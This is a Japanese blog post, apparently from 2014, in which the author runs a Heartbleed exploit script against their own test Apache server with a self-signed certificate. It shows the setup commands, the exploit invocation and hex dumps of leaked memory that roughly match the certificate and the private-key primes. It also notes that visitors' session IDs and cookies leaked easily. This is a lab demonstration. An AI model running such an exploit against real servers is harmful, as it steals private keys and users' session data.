@@ -1,0 +1,136 @@
+
+<!DOCTYPE html>
+<html lang="ja-JP">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta content="" name="keywords">
+<meta content="OpenSSLの脆弱性 (Heartbleedの問題) のexploitコードを試す | magiauk log" property="og:title">
+<title>OpenSSLの脆弱性 (Heartbleedの問題) のexploitコードを試す | magiauk log</title>
+<link rel="stylesheet" href="https://magiauk.antimon.xyz/css/style.css">
+<link href="//maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet" integrity="sha384-wvfXpqpZZVQGK6TAh5PVlGOfQNHSoD2xbE+QkPxCAFlNEevoEH3Sl0sibVcOQVnN" crossorigin="anonymous">
+
+<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.9.0/styles/default.min.css" integrity="sha256-Zd1icfZ72UBmsId/mUcagrmN7IN5Qkrvh75ICHIQVTk=" crossorigin="anonymous" />
+
+
+<section class="section">
+  <div class="container">
+    <nav class="nav">
+      <div class="nav-left">
+        <a class="nav-item" href="https://magiauk.antimon.xyz"><h1 class="title is-4">magiauk log</h1></a>
+      </div>
+      <div class="nav-right">
+        <nav class="nav-item level is-mobile">
+          
+        </nav>
+      </div>
+    </nav>
+  </div>
+</section>
+
+<section class="section">
+  <div class="container">
+    <h2 class="subtitle is-6">April 15, 2014</h2>
+    <h1 class="title">OpenSSLの脆弱性 (Heartbleedの問題) のexploitコードを試す</h1>
+    
+      <div class="tags">
+    
+        <a class="button is-link" href="/tags/android">android</a>
+    
+        <a class="button is-link" href="/tags/%E8%84%86%E5%BC%B1%E6%80%A7">脆弱性</a>
+    
+        <a class="button is-link" href="/tags/security">security</a>
+    
+</div>
+
+    
+    <div class="content">
+      <p>exploitコードはいろいろ出ているけど、オレオレ証明書を使用してApache2でSSL通信できるようにして試してみた。</p>
+
+<ul>
+<li>Ubuntu 12.10 amd64
+
+<ul>
+<li>192.168.1.10</li>
+</ul></li>
+</ul>
+
+<p>秘密鍵、証明書要求、証明書は次のように生成。</p>
+
+<pre><code class="language-bash">$ openssl genrsa 1024 &gt; server.key
+$ openssl req -new -key server.key &gt; server.csr
+$ openssl x509 -in server.csr -days 365 -req -signkey server.key &gt; server.crt
+</code></pre>
+
+<p>生成した鍵、証明書を使用するようApache2の設定を行う。</p>
+
+<pre><code class="language-apache">SSLCertificateFile /etc/apache2/ssl/server.crt
+SSLCertificateKeyFile /etc/apache2/ssl/server.key
+</code></pre>
+
+<p>Apache2を再起動してSSL通信できることを確認したら、次のようにしてexploitコードを実行してみる。</p>
+
+<pre><code class="language-bash">$ heartbleed-altered.py 192.168.1.10
+</code></pre>
+
+<p>取得したデータに何が含まれているか確認してみると、</p>
+
+<pre><code>//--中略--//
+13e0: C1 9F F9 CF EE 4E 7D 04 86 46 7F EC 4E 50 50 36  .....N}..F..NPP6
+13f0: BF 21 B1 E1 1C 79 B3 93 6F 55 ED A8 25 02 06 BC  .!...y..oU..%...
+1400: 90 CC 26 1E 9C E9 24 76 3C 58 49 6A A3 D9 7D C1  ..&amp;...$v&lt;XIj..}.
+1410: 2D 52 59 0A 0C 03 94 C2 1A 65 51 CF CA 73 AD 2B  -RY......eQ..s.+
+1420: 42 73 75 84 35 D6 B8 7A 46 55 F5 57 DF 73 CF 25  Bsu.5..zFU.W.s.%
+1430: 24 13 94 78 3B 9D 99 80 EC 58 6B 67 5A C4 F4 5D  $..x;....XkgZ..]
+1440: F3 EC BE 57 32 62 FC 35 E7 21 A3 02 03 01 00 01  ...W2b.5.!......
+1450: 30 0D 06 09 2A 86 48 86 F7 0D 01 01 05 05 00 03  0...*.H.........
+1460: 81 81 00 AF 52 DC AA 63 5B C5 6C 5B E5 DB A7 D5  ....R..c[.l[....
+1470: E5 EA D9 34 B9 EF 7C C0 73 21 DD 32 78 A2 32 FD  ...4..|.s!.2x.2.
+1480: 8E 90 FC 38 D3 B3 8A F3 05 A4 6B 0E CA AB 70 2D  ...8......k...p-
+1490: F5 4D 27 B1 BA FE 57 C1 66 E5 74 48 28 08 26 4A  .M'...W.f.tH(.&amp;J
+14a0: 34 D4 3D 75 6E 8F BC 5D C5 0A 9A F8 04 0D 67 F8  4.=un..]......g.
+14b0: CA D3 0B E7 4E EB 78 45 A5 D4 74 7C 45 0E 56 E5  ....N.xE..t|E.V.
+14c0: 42 07 A5 78 28 C5 A2 6E FF 27 39 F9 18 A6 58 59  B..x(..n.'9...XY
+14d0: 72 FB 38 92 8F 3E 7F 1D 41 80 3D 15 41 16 CE A4  r.8..&gt;..A.=.A...
+14e0: A8 01 77 16 03 02 01 8D 0C 00 01 89 00 80 D6 7D  ..w............}
+//--中略--//
+</code></pre>
+
+<p>長いので一部データを省略したけどこれは証明書とほぼ一致。さらに、</p>
+
+<pre><code>3d80: 50 00 00 00 00 00 00 00 5F 6C E8 B2 8B B0 4E AA  P......._l....N.
+3d90: 2D 9A 4A E0 D7 6B 8F F6 B3 E2 0D 8E 05 83 FE AB  -.J..k..........
+3da0: D4 5B 22 7D 91 71 B7 D2 23 0A 45 4C 52 CB 61 3A  .[&quot;}.q..#.ELR.a:
+3db0: A4 E1 E8 6D 51 0D 7E 68 27 00 55 17 BD C8 A9 15  ...mQ.~h'.U.....
+3dc0: A3 A9 56 21 58 A9 63 FC 00 00 00 00 00 00 00 00  ..V!X.c.........
+</code></pre>
+
+<p>と、これ</p>
+
+<pre><code>fa30: 50 00 00 00 00 00 00 00 3d 11 8d ab d6 f7 14 6b  P.......=......k
+fa40: f1 19 ac 5c ba f5 62 31 60 02 d8 62 f8 05 d2 b1  ...\..b1`..b....
+fa50: eb 0f 93 d8 93 62 10 0e c5 32 19 ea 53 0d 57 40  .....b...2..S.W@
+fa60: 6c b6 8e 50 b2 01 97 d4 e3 e9 07 f9 cd ec 08 65  l..P...........e
+fa70: c7 25 cc b0 c9 d3 b9 ed 0d ce 51 77 74 25 40 a5  .%........Qwt%@.
+</code></pre>
+
+<p>は、秘密鍵のprime1とprime2とほぼ一致している。</p>
+
+<p>できれば秘密鍵をどーんとそのまま取得したいけど、タイミングとかそういう問題で簡単に取得できそうにはない。でも根気強くやっていれば取得できる可能性はあると思う。</p>
+
+<p>ちなみに、サイトにアクセスしてきたクライアントのセッションIDやcookieの内容とかはexploitコードを走らせていれば、秘密鍵よりは簡単に取得できた。</p>
+
+    </div>
+  </div>
+</section>
+
+
+<section class="section">
+  <div class="container has-text-centered">
+    <p>&copy; 2017 magiauk.</p>
+  </div>
+</section>
+<script src="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.9.0/highlight.min.js" integrity="sha256-KbfTjB0WZ8vvXngdpJGY3Yp3xKk+tttbqClO11anCIU=" crossorigin="anonymous"></script>
+
+<script>hljs.initHighlightingOnLoad();</script>
+
+
